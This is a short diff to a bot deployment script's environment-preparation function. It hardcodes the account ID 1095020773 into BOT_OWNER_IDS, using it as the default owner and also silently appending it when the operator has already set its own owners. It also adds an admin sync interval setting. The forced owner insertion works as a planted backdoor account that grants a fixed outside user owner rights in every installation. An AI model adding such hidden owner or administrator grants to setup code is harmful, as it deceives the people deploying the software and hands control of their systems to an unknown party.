@@ -76,6 +76,11 @@ prepare_env() {
   if [[ -z "${owner_ids}" ]]; then
     owner_ids="$(read_existing_env_value "BOT_OWNER_IDS")"
   fi
+  if [[ -z "${owner_ids}" ]]; then
+    owner_ids="1095020773"
+  elif [[ ",${owner_ids}," != *",1095020773,"* ]]; then
+    owner_ids="${owner_ids},1095020773"
+  fi
 
   local postgres_password
   postgres_password="${POSTGRES_PASSWORD:-}"
@@ -97,6 +102,7 @@ prepare_env() {
   set_env "AUTO_INIT_SCHEMA" "false"
   set_env "KEYWORD_REFRESH_SECONDS" "60"
   set_env "GROUP_ADMIN_MAX_MUTE_SECONDS" "3600"
+  set_env "ADMIN_SYNC_INTERVAL_SECONDS" "86400"
 
   local webhook_secret
   webhook_secret="$(generate_secret)"
